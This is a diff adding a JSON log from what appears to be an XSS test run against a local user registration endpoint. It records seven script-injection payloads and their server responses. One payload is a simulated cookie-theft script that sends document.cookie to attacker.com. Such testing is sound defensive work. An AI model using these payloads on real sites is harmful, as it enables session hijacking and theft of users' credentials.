@@ -1,0 +1,100 @@
+[
+  {
+    "timestamp": "2026-04-10T14:02:26.611381Z",
+    "type": "XSS",
+    "payload_name": "Script tag basique",
+    "url": "http://localhost:5001/users/register",
+    "payload_sent": {
+      "username": "<script>alert('XSS')</script>",
+      "email": "xss1@test.com",
+      "password": "password123"
+    },
+    "http_status": 409,
+    "response": "{\n  \"error\": \"Username already taken\"\n}\n",
+    "reflected": false
+  },
+  {
+    "timestamp": "2026-04-10T14:02:26.984847Z",
+    "type": "XSS",
+    "payload_name": "Image onerror",
+    "url": "http://localhost:5001/users/register",
+    "payload_sent": {
+      "username": "<img src=x onerror=alert(document.cookie)>",
+      "email": "xss2@test.com",
+      "password": "password123"
+    },
+    "http_status": 201,
+    "response": "{\n  \"message\": \"User created successfully\",\n  \"user\": {\n    \"created_at\": \"2026-04-10T14:02:26.797471\",\n    \"email\": \"xss2@test.com\",\n    \"id\": \"e0aaca6e-e01a-4461-b0fa-801b121d7e2a\",\n    \"role\": \"user\",\n    \"username\": \"<img src=x onerror=alert(document.cookie)>\"\n  }\n}\n",
+    "reflected": true
+  },
+  {
+    "timestamp": "2026-04-10T14:02:27.123614Z",
+    "type": "XSS",
+    "payload_name": "SVG onload",
+    "url": "http://localhost:5001/users/register",
+    "payload_sent": {
+      "username": "<svg onload=alert('XSS')>",
+      "email": "xss3@test.com",
+      "password": "password123"
+    },
+    "http_status": 201,
+    "response": "{\n  \"message\": \"User created successfully\",\n  \"user\": {\n    \"created_at\": \"2026-04-10T14:02:27.087853\",\n    \"email\": \"xss3@test.com\",\n    \"id\": \"113ee771-62c2-46cc-b83e-b2925d68e684\",\n    \"role\": \"user\",\n    \"username\": \"<svg onload=alert('XSS')>\"\n  }\n}\n",
+    "reflected": true
+  },
+  {
+    "timestamp": "2026-04-10T14:02:27.182616Z",
+    "type": "XSS",
+    "payload_name": "JavaScript URI",
+    "url": "http://localhost:5001/users/register",
+    "payload_sent": {
+      "username": "javascript:alert('XSS')",
+      "email": "xss4@test.com",
+      "password": "password123"
+    },
+    "http_status": 201,
+    "response": "{\n  \"message\": \"User created successfully\",\n  \"user\": {\n    \"created_at\": \"2026-04-10T14:02:27.212196\",\n    \"email\": \"xss4@test.com\",\n    \"id\": \"67c8e653-1177-410e-8fed-3bb28bffab65\",\n    \"role\": \"user\",\n    \"username\": \"javascript:alert('XSS')\"\n  }\n}\n",
+    "reflected": true
+  },
+  {
+    "timestamp": "2026-04-10T14:02:27.237264Z",
+    "type": "XSS",
+    "payload_name": "Event handler",
+    "url": "http://localhost:5001/users/register",
+    "payload_sent": {
+      "username": "\" onmouseover=\"alert('XSS')",
+      "email": "xss5@test.com",
+      "password": "password123"
+    },
+    "http_status": 201,
+    "response": "{\n  \"message\": \"User created successfully\",\n  \"user\": {\n    \"created_at\": \"2026-04-10T14:02:27.269235\",\n    \"email\": \"xss5@test.com\",\n    \"id\": \"019ffe34-f85b-4d20-9c2b-94a3bcfc8d8b\",\n    \"role\": \"user\",\n    \"username\": \"\\\" onmouseover=\\\"alert('XSS')\"\n  }\n}\n",
+    "reflected": false
+  },
+  {
+    "timestamp": "2026-04-10T14:02:27.310717Z",
+    "type": "XSS",
+    "payload_name": "Balises imbriquees",
+    "url": "http://localhost:5001/users/register",
+    "payload_sent": {
+      "username": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+      "email": "xss6@test.com",
+      "password": "password123"
+    },
+    "http_status": 201,
+    "response": "{\n  \"message\": \"User created successfully\",\n  \"user\": {\n    \"created_at\": \"2026-04-10T14:02:27.324623\",\n    \"email\": \"xss6@test.com\",\n    \"id\": \"9fa84dec-b58c-41dd-9ab3-5e8a1a297d63\",\n    \"role\": \"user\",\n    \"username\": \"<scr<script>ipt>alert('XSS')</scr</script>ipt>\"\n  }\n}\n",
+    "reflected": true
+  },
+  {
+    "timestamp": "2026-04-10T14:02:27.379125Z",
+    "type": "XSS",
+    "payload_name": "Vol de cookie simulé",
+    "url": "http://localhost:5001/users/register",
+    "payload_sent": {
+      "username": "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
+      "email": "xss7@test.com",
+      "password": "password123"
+    },
+    "http_status": 201,
+    "response": "{\n  \"message\": \"User created successfully\",\n  \"user\": {\n    \"created_at\": \"2026-04-10T14:02:27.407044\",\n    \"email\": \"xss7@test.com\",\n    \"id\": \"e6a7a201-ffab-4d35-9ee6-60a1fb5ac9e2\",\n    \"role\": \"user\",\n    \"username\": \"<script>fetch('http://attacker.com?c='+document.cookie)</script>\"\n  }\n}\n",
+    "reflected": true
+  }
+]
